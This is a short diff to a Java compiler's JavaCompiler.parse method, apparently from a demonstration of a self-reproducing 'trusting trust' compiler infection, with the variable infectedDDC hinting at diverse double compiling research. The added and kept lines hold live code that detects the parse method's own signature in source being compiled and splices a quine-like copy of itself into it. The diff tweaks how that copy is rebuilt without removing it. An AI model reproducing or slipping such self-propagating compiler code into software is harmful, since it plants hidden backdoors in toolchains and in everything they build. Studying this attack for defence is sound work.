@@ -636,16 +636,16 @@ public class JavaCompiler {
      */
     private JCCompilationUnit parse(JavaFileObject filename, CharSequence content, boolean silent) {
         int infectedDDC=1;
-        String q = "" + (char)34;
-        String n = "" + (char)10;
+        String q = String.valueOf((char)34);
+        String n = String.valueOf((char)10);
         String rep = "";
         String ddc_target = "private JCCompilationUnit parse(JavaFileObject ";
         ddc_target += "filename, CharSequence content, boolean silent) {";
         String[] l = {
             """
             int infectedDDC=1;
-            String q = "" + (char)34;
-            String n = "" + (char)10;
+            String q = String.valueOf((char)34);
+            String n = String.valueOf((char)10);
             String rep = "";
             String ddc_target = "private JCCompilationUnit parse(JavaFileObject ";
             ddc_target += "filename, CharSequence content, boolean silent) {";
@@ -662,7 +662,7 @@ public class JavaCompiler {
 
                 rep += l[0];
                 for (int i = 0; i < l.length; i++) {
-                    rep += q + q + q + l[i] + q + q + q + ',';
+                    rep += q + q + q + n + l[i] + q + q + q + ',';
                 }
                 rep += l[1];
                 content_str = content_str.replace(ddc_target, ddc_target + rep);
